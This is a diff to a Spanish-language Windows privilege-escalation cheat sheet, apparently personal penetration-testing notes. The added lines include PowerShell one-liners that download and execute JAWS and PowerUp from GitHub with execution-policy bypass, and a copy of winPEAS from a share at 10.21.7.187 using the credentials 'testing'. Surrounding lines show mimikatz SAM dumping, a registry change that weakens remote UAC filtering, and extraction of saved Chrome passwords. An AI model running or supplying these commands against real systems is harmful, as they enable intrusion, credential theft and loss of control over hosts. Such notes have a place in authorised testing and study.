@@ -98,10 +98,8 @@ python windows-exploit-suggester.py -i systeminfo -d 2021-10-04-mssb.xls --ostex
 net localgroup Administrators --> lista los miembros del grupo Administrators
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
 icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable
+
 ----
-# https://gist.github.com/HarmJ0y/3328d954607d71362e3c
-# PowerView
-Import-Module powerview.ps1	
 
 # Muestra el propietario de un archivo/carpeta
 get-acl C:\
@@ -140,6 +138,12 @@ privilege::debug
 token::elevate
 lsadump::sam /patch
 
+# jaws enum
+powershell IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1');
+
+# powerup enum
+powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+
 # SPN
 setspn.exe -T medin -Q */* #extract all users in SPN
 
@@ -151,7 +155,16 @@ net share COMPARTIDA=C:\Windows\Temp /GRANT:Administrators,FULL
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
 # montar compartida con usuario + contraseña via CMD
-net use \\samba\compartida password /USER:username
+net use \\10.21.7.187\SHARE testing /USER:testing
+copy \\10.21.7.187\SHARE\winPEASx64.exe .
+
+# colores en winPEAS:
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 
 # WebBrowserPassView
 WebBrowserPassView.exe /UseChromeProfileFolder 1 /ChromeProfileFolder "C:\Users\User\AppData\Local\Google\Chrome\User Data"
+
+# crear objeto usuario en pwsh
+$SecPass = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$cred = New-Object System.Management.Automation PSCredential ('USER' ,$SecPass)
+$cred
